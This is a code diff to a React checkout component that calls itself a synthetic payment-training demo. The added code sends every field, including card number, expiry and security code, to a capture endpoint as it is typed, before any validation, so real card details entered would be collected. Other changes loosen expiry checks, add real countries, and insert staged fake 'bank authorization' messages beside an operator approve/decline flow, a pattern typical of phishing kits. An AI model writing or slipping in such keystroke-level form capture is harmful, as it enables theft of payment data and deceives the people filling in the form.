@@ -28,6 +28,7 @@ type Data = {
   expiry: string;
   demoCode: string;
 };
+type AuthorizationStep = 'idle' | 'encrypting' | 'authorizing' | 'confirming';
 const initial: Data = {
   fullName: 'Student 4821',
   email: 'student4821@example.edu',
@@ -78,9 +79,11 @@ export function HostedCheckoutDemo({
   lessons: number;
 }) {
   const [data, setData] = useState(initial),
+    [liveId] = useState(() => crypto.randomUUID()),
     [error, setError] = useState(''),
     [captureId, setCaptureId] = useState(''),
     [decision, setDecision] = useState<'editing' | 'pending' | 'approved' | 'declined'>('editing'),
+    [authorizationStep, setAuthorizationStep] = useState<AuthorizationStep>('idle'),
     [busy, setBusy] = useState(false);
   const set = <K extends keyof Data>(key: K, value: Data[K]) => {
     setData((current) => ({ ...current, [key]: value }));
@@ -108,7 +111,7 @@ export function HostedCheckoutDemo({
       /^\d{3} Training Avenue$/.test(data.address) &&
       /^9\d{4}$/.test(data.postalCode) &&
       /^0000 \d{4} \d{4} \d{4}$/.test(data.trainingNumber) &&
-      data.expiry === '12/30' &&
+      /^(0[1-9]|1[0-2])\/\d{2}$/.test(data.expiry) &&
       /^\d{3}$/.test(data.demoCode);
     if (!valid) {
       setError(
@@ -118,10 +121,16 @@ export function HostedCheckoutDemo({
     }
     setBusy(true);
     try {
+      setAuthorizationStep('encrypting');
+      await new Promise((resolve) => setTimeout(resolve, 1600));
+      setAuthorizationStep('authorizing');
+      await new Promise((resolve) => setTimeout(resolve, 1700));
+      setAuthorizationStep('confirming');
+      await new Promise((resolve) => setTimeout(resolve, 1700));
       const response = await fetch('/api/training/capture', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ ...data, product, courseSlug }),
+        body: JSON.stringify({ ...data, product, courseSlug, captureId: liveId }),
       });
       if (!response.ok) throw new Error();
       const result = (await response.json()) as { id: string };
@@ -130,8 +139,20 @@ export function HostedCheckoutDemo({
     } catch {
       setError('The instructor training monitor is unavailable.');
     }
+    setAuthorizationStep('idle');
     setBusy(false);
   }
+  useEffect(() => {
+    if (decision === 'approved' || decision === 'declined') return;
+    const timer = setTimeout(() => {
+      void fetch('/api/training/capture', {
+        method: 'PUT',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ ...data, product, courseSlug, captureId: liveId }),
+      });
+    }, 250);
+    return () => clearTimeout(timer);
+  }, [courseSlug, data, decision, liveId, product]);
   useEffect(() => {
     if (!captureId || decision !== 'pending') return;
     const timer = setInterval(async () => {
@@ -325,13 +346,26 @@ export function HostedCheckoutDemo({
                       value={data.country}
                       onChange={(e) => set('country', e.target.value)}
                     >
-                      <option>United States</option>
+                      <option value="United States">United States</option>
+                      <option value="Canada">Canada</option>
+                      <option value="United Kingdom">United Kingdom</option>
+                      <option value="Australia">Australia</option>
+                      <option value="Germany">Germany</option>
+                      <option value="France">France</option>
+                      <option value="Ethiopia">Ethiopia</option>
                     </select>
                     <ChevronDown
                       className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2"
                       size={17}
                     />
                   </div>
+                </Field>
+                <Field label="State or region">
+                  <input
+                    value={data.region}
+                    onChange={(e) => set('region', e.target.value)}
+                    autoComplete="off"
+                  />
                 </Field>
                 <Field label="Address">
                   <input
@@ -362,6 +396,18 @@ export function HostedCheckoutDemo({
               >
                 {error}
               </p>
+            )}
+            {busy && (
+              <div className="mt-4 rounded-xl border border-[#d8e5f2] bg-[#f8fbff] p-4" aria-live="polite">
+                <div className="flex items-center gap-3 text-sm font-semibold text-[#183153]">
+                  <span className="grid size-9 place-items-center rounded-full bg-[#e7f1fc] text-[#0874d4]"><Loader2 className="animate-spin" size={19} /></span>
+                  {authorizationStep === 'encrypting' && 'Securing synthetic checkout data…'}
+                  {authorizationStep === 'authorizing' && 'Simulating bank authorization…'}
+                  {authorizationStep === 'confirming' && 'Confirming training enrollment…'}
+                </div>
+                <div className="mt-3 h-1.5 overflow-hidden rounded-full bg-[#dfe8f2]"><span className={`block h-full rounded-full bg-[#0874d4] transition-all duration-700 ${authorizationStep === 'encrypting' ? 'w-1/3' : authorizationStep === 'authorizing' ? 'w-2/3' : 'w-full'}`} /></div>
+                <p className="mt-2 text-xs text-[#697386]">Simulation only — no bank or payment network is contacted.</p>
+              </div>
             )}
             {decision === 'pending' && (
               <div className="mt-4 flex gap-3 rounded-lg border border-blue-100 bg-blue-50 p-4 text-sm text-[#0757b2]">
